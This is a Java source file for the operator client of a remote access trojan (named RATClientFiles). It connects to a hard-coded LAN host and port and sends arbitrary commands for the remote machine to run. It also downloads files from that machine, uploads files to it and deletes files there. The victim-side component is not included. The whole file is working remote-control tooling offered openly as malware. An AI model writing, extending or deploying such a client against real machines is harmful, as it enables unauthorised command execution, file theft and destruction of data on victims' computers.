import java.io.*;
import java.net.Socket;
import java.util.Scanner;

public class RATClientFiles {
    // pfad zum download (anpassen wenn nötig)
    private static final String DOWNLOAD_DIR = "C:\\Users\\victo\\Downloads\\";

    public static void main(String[] args) {
        try (Scanner scanner = new Scanner(System.in);
			//String target_ip = 192.168.178.69;
			//String target_port = 8080;
			//System.out.println("Select a ip for the target, or press enter to use the standard ip. Standard ip = " + target_ip);
			//String target_ip = scanner.nextLine();
			//System.out.println("Select the Port used or press enter to use the standard port. Standard Port = " + target_port);
			// check if new input is give, how?
			//String target_ip = scanner.nextLine();
             Socket socket = new Socket("192.168.178.37", 8080);
  			 // Socket socket = new Socket(target_ip, target_port);
             DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
             DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()))) {
            System.out.println("Connected to Server at: '" + socket.getInetAddress().getHostAddress() + "' Enter a command:");

            while (true) {
                System.out.print("Enter command: ");
                String command = scanner.nextLine();

                if ("exit".equalsIgnoreCase(command)) {
                    System.out.println("Exiting client...");
                    break;
                }

                if (command.startsWith("UPLOAD")) {
                    sendFile(out, command.split(" ")[1]);
                } else if (command.startsWith("DOWNLOAD")) {
                    String filePath = command.split(" ")[1];
                    String fileName = new File(filePath).getName();

                    out.writeUTF("DOWNLOAD");
                    out.writeUTF(filePath);
                    out.flush();
                    receiveFile(in, DOWNLOAD_DIR + fileName);
                }
                else if (command.startsWith("DELETE")) {
                String filePath = command.substring("DELETE ".length());
                out.writeUTF("DELETE");
                out.writeUTF(filePath);
                out.flush();
                    String serverResponse;
                    while (true) {
                        serverResponse = in.readUTF();
                        if ("END_OF_RESPONSE".equals(serverResponse)) {
                            break;
                        }
                        System.out.println(serverResponse);
                    }                
                } else {
                    out.writeUTF(command);
                    out.flush();

                    System.out.println("\n[Command Sent: " + command + "]\n");

                    String serverResponse;
                    System.out.println("[Command Output Start]");
                    while (true) {
                        serverResponse = in.readUTF();
                        if ("END_OF_RESPONSE".equals(serverResponse)) {
                            break;
                        }
                        System.out.println(serverResponse);
                    }
                    System.out.println("[Command Output End]\n");
                }

                System.out.print("Enter next command, or type 'exit' to quit:\n");
            }
        } catch (IOException e) {
            System.out.println("An error occurred: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void sendFile(DataOutputStream out, String filePath) throws IOException {
        File file = new File(filePath);
        if (file.exists()) {
            out.writeUTF("UPLOAD");
            out.writeUTF(file.getName());
            out.writeLong(file.length());
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[4096];
                int read;
                while ((read = fis.read(buffer)) != -1) {
                    out.write(buffer, 0, read);
                }
            }
            out.flush();
            System.out.println("[Client] File sent: " + filePath);
        } else {
            System.out.println("[Client] File not found: " + filePath);
        }
    }

    private static void receiveFile(DataInputStream in, String fileName) throws IOException {
        long fileSize = in.readLong();
        if (fileSize > 0) {
            File downloadFile = new File(fileName);
            File parentDir = downloadFile.getParentFile();
            if (!parentDir.exists()) {
                parentDir.mkdirs();
            }

            try (FileOutputStream fos = new FileOutputStream(downloadFile)) {
                byte[] buffer = new byte[4096];
                int read;
                long totalRead = 0;
                while (totalRead < fileSize && (read = in.read(buffer, 0, Math.min(buffer.length, (int)(fileSize - totalRead)))) != -1) {
                    fos.write(buffer, 0, read);
                    totalRead += read;
                }
            }
            System.out.println("[Client] File received and saved as: " + fileName);
        } else {
            System.out.println("[Client] File not found on server.");
        }
    }
}
